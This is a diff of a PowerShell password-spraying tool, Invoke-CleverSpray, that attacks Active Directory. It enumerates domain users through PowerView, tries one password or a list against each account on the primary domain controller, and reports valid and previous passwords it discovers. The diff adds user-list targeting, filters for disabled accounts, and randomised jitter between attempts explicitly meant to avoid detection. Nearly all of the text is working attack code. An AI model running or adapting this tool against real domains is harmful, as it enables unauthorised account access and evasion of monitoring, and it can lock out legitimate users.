@@ -1,18 +1,19 @@
 <#
-	Function: Invoke-CleverSpray
-	Author : Francois Lelievre (@dafanch)
+    Function: Invoke-CleverSpray
+    Author : Francois Lelievre (@dafanch)
     Taking profit of: Convert-LDAPProperty, Get-NetDomain and Get-NetUser from PowerView - by Will Schroeder (@harmj0y)
     License: BSD 3-Clause
     Required Dependencies: None
     Optional Dependencies: None
 
     TO DO : 
-        > ADD -User or -UserList
         > ADD -Group
         > ADd -OU  
 
 #>
 
+# UserAccountControl list to avoid testing disabled accounts  
+$disabledUserAccountControl = 2,514,546,66050,66082,262658,262690,328194,328226
 
 function Invoke-CleverSpray {
 <#
@@ -24,199 +25,231 @@ function Invoke-CleverSpray {
     .PARAMETER Password
         Password to spray.
 
-	.PARAMETER PasswordFile
+    .PARAMETER PasswordsFile
         Path to file containing the list of passwords to spray.
+
+    .PARAMETER User
+        Path to file containing the list of users to target.
 
     .PARAMETER UserFile
         Path to file containing the list of users to attack.
 
-	.PARAMETER Limit
-        Integer to substract to "badPwdCount" to avoid blocking accounts (must be at least 2 ; default is 2)
+    .PARAMETER Limit
+        Limit spraying to accounts having "badPwdCount" inferior to <Limit> - Default 2
 
-	.PARAMETER HideOld
+    .PARAMETER HideOld
         Hide old password discovered (default is false)
 
     .PARAMETER Delay
         Delay between authentication attemps
 
-	.PARAMETER Domain
+    .PARAMETER Jitter
+        Jitter for the authentication delay, defaults to +/- 0.3
+
+    .PARAMETER Domain
         The domain to query for users, defaults to the current domain.
-		
+        
 #>
 
     param(
         [String]
         $Password,
-		
-		[String]
-        $PasswordFile,
+        
+        [String]
+        $PasswordsFile,
 
         [String]
-        $User,
+        $Username,
 
         [String]
-        $UserFile,
-		
-		[Int]
-		$Limit = 2,
-		
-		[Switch]
-		$HideOld,
-
+        $UsernamesFile,
+        
         [Int]
+        $Limit = 1,
+        
+        [Switch]
+        $HideOld,
+
+        [UInt32]
         $Delay = 0,
+
+        [Double]
+        $Jitter = 0.3,
 
         [String]
         $Domain
     )
-	
-	# Get current DOMAIN if not set as a parameter (using PowerView) and get the PDCe DC
-	if ($Domain -eq "") {
-		Try {
-			$Domain = (Get-NetDomain).name
-			$DomainController = ((Get-NetDomain).PdcRoleOwner).name
-		}
-		Catch {
+    
+    # Get current DOMAIN if not set as a parameter (using PowerView) and get the PDCe DC
+    if ($Domain -eq "") {
+        Try {
+            $Domain = (Get-NetDomain).name
+            $DomainController = ((Get-NetDomain).PdcRoleOwner).name
+        }
+        Catch {
             Write-Host "[-] Domain cannot be retrieved..." -ForegroundColor Red
-			Return
+            Return
         }
     }
-	# Else get the DOMAIN set as parameter PDCe DC
-	else {
+    # Else get the DOMAIN set as parameter PDCe DC
+    else {
         $DomainController = ((Get-NetDomain -Domain $Domain).PdcRoleOwner).name
-		if ($DomainController -eq $null){
-			Write-Host "[-] Domain cannot be retrieved..." -ForegroundColor Red
-			Return
-		}
-	}
+        if ($DomainController -eq $null){
+            Write-Host "[-] Domain cannot be retrieved..." -ForegroundColor Red
+            Return
+        }
+    }
 
-
-    if($PasswordFile -And ($Password -eq "")){
+    # Check passwords related arguments
+    if($PasswordsFile -And ($Password -eq "")){
         Try {
-            $PasswordList = Get-Content $PasswordFile
+            $PasswordList = Get-Content $PasswordsFile
             if ($PasswordList.Count -le 1){
                 Write-Host "[-] Password file must contain at least 2 passwords...Please use the -Password option to specify a unique password to spray"
                 Return
             }
+            else {
+                Write-Host "[-] Passwords within the file $PasswordsFile will be sprayed"
+            }
         }
         Catch {
-            Write-Host "[-] Invalid Password File $PasswordFile" -ForegroundColor Red	
-			Return			
+            Write-Host "[-] Invalid Password File $PasswordsFile" -ForegroundColor Red  
+            Return          
         }
     }
-	# If a Password is given
-	elseif ($Password -And ($PasswordFile -eq "")){
-		Write-Host "[!] Password to test on $Domain user accounts against the PDCe $DomainController : $Password" -ForegroundColor Gray
-		$PasswordList = $Password
-	}
-	# If a Password and a PasswordFile is given, return an error (if they are both empty or not empty)
-	elseif ( (($Password -eq "") -And ($PasswordFile -eq "")) -Or ($Password -And $PasswordFile)) {
-		Write-Host "[-] Please specify either a password (-Password) or a path to a file containing passwords (-PasswordFile)" -ForegroundColor Red;
-		Return
-	}
-
-	$Users = Get-NetUser -DomainController $DomainController -Domain $Domain -filter "(!userAccountControl:1.2.840.113556.1.4.803:=2)"
-	
-	$NbUsers = $Users.count
-	
-	# Get the Domain lockout policy
-	$LockOutThreshold = Get-LockOutThreshold
-	
-	
-    if ($LockOutThreshold -eq -1){
-        Write-Host "[!] Awesome, user accounts can never be locked out !" -ForegroundColor Gray
-		#set a high value to represent that accounts can never be locked
-		$LockOutThresholdMinusLimit = 1000000000
-    } else {
-        Write-Host "[!] Current lockout threshold is $LockOutThreshold" -ForegroundColor Gray
-        $LockOutThresholdMinusLimit = $LockOutThreshold - $Limit
-        Write-Host "[!] Only users having 'badpwdcount' attribute lower or equal to $LockOutThresholdMinusLimit will be tested ($LockOutThreshold-$Limit)..." -ForegroundColor Gray
-        Write-Host "     > Use the Limit parameter (-Limit) to lower this value and decrease the risks of blocking user accounts (default is 2)" -ForegroundColor Gray
-	
+    # If a Password is given
+    elseif ($Password -And ($PasswordsFile -eq "")){
+        $PasswordList = $Password
     }
-	if ($Limit -lt 2){
-		Write-Host "[-] To avoid locking user accounts, please set a limit greater or equal to 2..." -ForegroundColor Red
-		Return
-	}
-	if (($Limit -gt $LockOutThreshold) -And ($LockOutThreshold -ne -1)){
-		Write-Host "[-] Limit cannot be superior to the current lockout threshold $LockOutThreshold..." -ForegroundColor Red
-		Return
-	}
-	
-	#initiate password counter (usefull when a PasswordList is given)
-	$PasswordCounter = 0
+    # If a Password and a PasswordsFile is given, return an error (if they are both empty or not empty)
+    elseif ( (($Password -eq "") -And ($PasswordsFile -eq "")) -Or ($Password -And $PasswordsFile)) {
+        Write-Host "[-] Please specify either a password (-Password) or a path to a file containing passwords (-PasswordsFile)" -ForegroundColor Red;
+        Return
+    }
+
+    # create disabled user accounts filter
+    $filter = Create-DisableFilter
+    # Check usernames related arguments
+    # If a UsernamesFile is given
+    if ($UsernamesFile -And ($Username -eq "")) {
+        Try {
+            $Users = Get-Content $UsernamesFile
+            if ($Users.Count -le 1){
+                Write-Host "[-] Usernames file must contain at least 2 usernames...Please use the -User option to specify a unique username to spray"
+                Return
+            }
+            else {
+                Write-Host "[!] Usernames contained in the file $UsernamesFile will be targeted" -ForegroundColor Gray
+            }
+        }
+        Catch {
+            Write-Host "[-] Invalid Usernames File $UsernamesFile" -ForegroundColor Red   
+            Return          
+        }
+    }
+    # If a Username is given
+    elseif ($Username -And ($UsernamesFile -eq "")) {
+        Write-Host "[!] The user $Username will be targeted" -ForegroundColor Gray
+        $Users = $Username
+        $NbUsers = 1
+    }
+    # If a Username and a PasswordsFile is given, return an error (if they are both empty or not empty)
+    elseif ($Username -And $UsernamesFile) {
+        Write-Host "[-] Please specify either a username (-Username) or a path to a file containing usernames (-Usernames)" -ForegroundColor Red;
+        Return
+    }
+    # If no Username and no UsernamesFile, retrieve the list of all users registered within the domain
+    else {
+        Write-Host "[*] Retrieving the list of users registered in the domain $Domain" -ForegroundColor Gray
+        $Users = (Get-NetUser -DomainController $DomainController -Domain $Domain -filter $filter | select samAccountName).samAccountName
+        $NbUsers = $Users.count
+    }
+
+    Write-Host "[!] Password spraying will be conducted on targets having a 'badPwdCount' lower or equal to $Limit" -ForegroundColor DarkCyan
+    Write-Host "[!] You can control this value using the -Limit parameter (at your own risk ;)" -ForegroundColor DarkCyan
+    
+    #initiate password counter (usefull when a PasswordList is given)
+    $PasswordCounter = 0
     $TotalNbOldPwdDiscovered = 0
     $TotalNbCurrentPwdDiscovered = 0
     $AllCurrentPwdDiscovered = ""
     $AllOldPwdDiscovered = ""
-	
-	Do {
-		#initiate UserCounter to print progress (%) of the attack while spraying
-		$UserCounter = 0
-		#if a PasswordFile is given, set the password to spray to the next password in the list
-		if ($PasswordFile){
-			$CurrentPassword = $PasswordList[$PasswordCounter]
-		}
-		#Else set the password to spray to the Password parameter 
-		else {
-			$CurrentPassword = $Password
-		}
-
-		Write-Host "`n[*] The password $CurrentPassword will now be tested on $NbUsers users" -ForegroundColor Gray
+    
+    Do {
+        #initiate UserCounter to print progress (%) of the attack while spraying
+        $UserCounter = 0
+        #if a PasswordsFile is given, set the password to spray to the next password in the list
+        if ($PasswordsFile){
+            $CurrentPassword = $PasswordList[$PasswordCounter]
+        }
+        #Else set the password to spray to the Password parameter 
+        else {
+            $CurrentPassword = $Password
+        }
+        Write-Host "[!] The password $Password will be sprayed on targeted user accounts having 'badPwdCount' attribute lower than $Limit" -ForegroundColor Gray
         
         $NbOldPwdDiscovered = 0
         $NbCurrentPwdDiscovered = 0
 
-		ForEach ($UserString in $Users) {
-
-            $SamAccountName = (@($UserString)).samaccountname
-
-			# Retrieve value of user's badPwdCount attribute on the PDCe DC !
-			$currBadPwdCount = (Get-NetUser -DomainController $DomainController -Domain $Domain  -UserName $SamAccountName | select badpwdcount).badpwdcount
-			# If accounts are never locked or the current user badPwdCount attribute is lower than the Threshold - Limit, go for it !
-			if (($LockOutThreshold -eq -1) -or ($currBadPwdCount -le $LockOutThresholdMinusLimit)) {
+        ForEach ($samAccountName in $Users) {
+            # Retrieve value of user's badPwdCount attribute on the PDCe DC !
+            $currBadPwdCount = (Get-NetUser -DomainController $DomainController -Domain $Domain  -UserName $samAccountName -filter $filter | select badpwdcount).badpwdcount
+            
+            # If accounts exists and the current user badPwdCount attribute is lower than the Threshold - Limit, go for it !
+            if (($currBadPwdCount -ne $Null) -And ($currBadPwdCount -le $Limit)) {
                 
-				$authResult = Test-ADAuthentication -DomainController $DomainController -UserName $SamAccountName -Password $CurrentPassword
-				if ($authResult) {
-					Write-Host "[+] Success: $SamAccountName $CurrentPassword" -ForegroundColor Green
-                    $AllCurrentPwdDiscovered += " - $SamAccountName $CurrentPassword`n"
-					$NbCurrentPwdDiscovered++
+                $authResult = Test-ADAuthentication -DomainController $DomainController -UserName $samAccountName -Password $CurrentPassword
+                if ($authResult) {
+                    Write-Host "[+] Success: $samAccountName $CurrentPassword" -ForegroundColor Green
+                    $AllCurrentPwdDiscovered += " - $samAccountName $CurrentPassword`n"
+                    $NbCurrentPwdDiscovered++
                     $TotalNbCurrentPwdDiscovered++
                 
-				}
-				
-				else {
-					$newBadPwdCount = (Get-NetUser -DomainController $DomainController -Domain $Domain  -UserName $SamAccountName | select badpwdcount).badpwdcount
-					if (($newBadPwdCount -eq $currBadPwdCount) -And (-Not $HideOld)) {
-						Write-Host "[+] Old password detected: $SamAccountName $CurrentPassword" -ForegroundColor Yellow
-						$AllOldPwdDiscovered += " - $SamAccountName $CurrentPassword`n"
+                }
+                # Check previous password only if account is not disabled
+                else {
+                    $newBadPwdCount = (Get-NetUser -DomainController $DomainController -Domain $Domain  -UserName $samAccountName | select badpwdcount).badpwdcount
+                    if (($newBadPwdCount -eq $currBadPwdCount) -And (-Not $HideOld)) {
+                        Write-Host "[+] Old password detected: $samAccountName $CurrentPassword" -ForegroundColor Yellow
+                        $AllOldPwdDiscovered += " - $samAccountName $CurrentPassword`n"
                         $NbOldPwdDiscovered++
                         $TotalNbOldPwdDiscovered++
-					}
-				}
-				Start-Sleep -Milliseconds $Delay
-				$UserCounter++
-				
-				if ($UserCounter % 100 -eq 0) {
-					Write-Host "[!] $UserCounter/$NbUsers user accounts tested..." -ForegroundColor Gray
-				}
-			}
-		}
-		
-		$PasswordCounter++
+                    }
+                }
+                if (-Not ($UserCount -eq ($NbUsers - 1))) {
+                    $RandNo = New-Object System.Random
+                    $WaitingTime = $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
+                    # sleep for our semi-randomized interval
+                    Start-Sleep -Seconds $WaitingTime
+                    Write-Verbose "[!] Waiting $WaitingTime seconds to avoid detection..."
+                }
+
+                $UserCounter++
+                
+                if ($UserCounter % 100 -eq 0) {
+                    Write-Host "[!] $UserCounter/$NbUsers user accounts tested..." -ForegroundColor Gray
+                }
+            }
+            else {
+                Write-Verbose "[!] Skipping user $samAccountName because it was either not found or it has a 'badPwdCount' superior to $Limit"
+            }
+        }
+        
+        $PasswordCounter++
 
         if (($NbOldPwdDiscovered -eq 0) -And ($NbCurrentPwdDiscovered -eq 0)){
             Write-Host "[-] No old or current password discovered using the password $CurrentPassword" -ForegroundColor Red
         }
-	
-	} While ( $PasswordCounter -le ([int]($PasswordList.Count)-1) )
+    
+    } While ( $PasswordCounter -le ([int]($PasswordList.Count)-1) )
 
     Write-Host "`n[!] Finished spraying !" -ForegroundColor Green
+    Write-Host "`n======== Results =========" -ForegroundColor Green
     Write-Host "[!] Number of valid passwords found: $TotalNbCurrentPwdDiscovered :" -ForegroundColor Green
-    Write-Host $AllCurrentPwdDiscovered
+    Write-Host $AllCurrentPwdDiscovered -ForegroundColor Green
     Write-Host "[!] Number of previous passwords found: $TotalNbOldPwdDiscovered :" -ForegroundColor Yellow
-    Write-Host $AllOldPwdDiscovered
-	
+    Write-Host $AllOldPwdDiscovered -ForegroundColor Yellow
+    
 }
 
 
@@ -237,22 +270,12 @@ function Test-ADAuthentication($DomainController, $UserName, $Password) {
     return $pc.ValidateCredentials($UserName,$Password, 1)
 }
 
-<#
-    .SYNOPSIS
-        Detects current domain LockOutThreshold
-#>
-function Get-LockOutThreshold {
-	$LockOutThreshold = (net accounts)[5].ToString().split(" ")[-1];
-    #If LockOutThreshold is (int) then set this value else if it is a string ("never") accounts get never locked so set it to -1
-    If ($LockOutThreshold -match '^\d+$'){
-	    return $LockOutThreshold;
+function Create-DisableFilter() {
+    foreach($userAccountControl in $disabledUserAccountControl) {
+        $filters += "(!userAccountControl:1.2.840.113556.1.4.803:=$userAccountControl)"
     }
-    Else
-    {
-	    return -1
-    }
+    return "(&$filters)"
 }
-
 
 <#
     PowerSploit Function: PowerView.ps1
